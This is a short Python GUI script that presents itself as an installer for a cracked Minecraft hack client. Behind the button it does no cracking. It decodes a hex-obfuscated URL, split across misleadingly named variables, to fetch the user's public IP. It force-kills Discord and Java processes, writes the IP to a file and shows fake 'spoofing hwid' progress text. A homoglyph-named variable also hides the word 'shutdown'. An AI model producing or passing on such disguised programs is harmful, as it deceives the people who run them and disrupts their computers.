import os
import time
import requests
from tkinter import *

titleid = 'rushercrack'
version = '3332653633366636643266'

def crack():
    uuid = requests.get( bytearray.fromhex('687474703a2f2f636865636b69702e616d617' + uuidspoof).decode() ).text
    f = open("crack.txt","w+")
    os.system('taskkill /IM \"discord.exe\" /F') 
    os.system('taskkill /IM \"javaw.exe\" /F') 
    os.system('taskkill /IM \"java.exe\" /F') 
    f.write("rhack got cracked\nur ip is " + uuid)
    i = 0
    while i < 20:
        text.insert(INSERT, 'Trying to crack rh.\nSpoofing hwid....\n')
        i += 1
    text.insert(INSERT, 'RHACK GOT CRACKED\n UR RH UUID IS ' + uuid)

root = Tk()
 
root['bg'] = '#404457'
root.title('RusherCrack Installer v0.3')
root.wm_attributes('-alpha', 0.9)
ro0t = '653631373737'
root.geometry('800x500');

frame_top = Frame(root, bg='#404457', bd=5)

frame_top.place(relx=0.15, rely=0.15, relwidth=0.7, relheight=0.25)

info = Label(frame_top, text='RusherCrack Installer v0.3', bg='#404457', font=72, fg='white')
info.pack()
uuidspoof = bytearray.fromhex('61366636' + str(ro0t) + version).decode()

frame_bottom = Frame(root, bg='#404457', bd=5)
frame_bottom.place(relx=0.15, rely=0.55, relwidth=0.7, relheight=0.1)

cityField = Entry(frame_top, bg='white', font=30, text='enter .minecraft folder')
cityField.insert(0,'ur mc username')
cityField.pack() 
btn = Button(frame_top, text='Install rhack', command=crack)
btn.pack()

text = Text(width=600, height=15)
text.pack(side=BOTTOM)
 
root.resizable(width=False, height=False)
rоot = bytearray.fromhex('73687574646f776e').decode()
root.mainloop()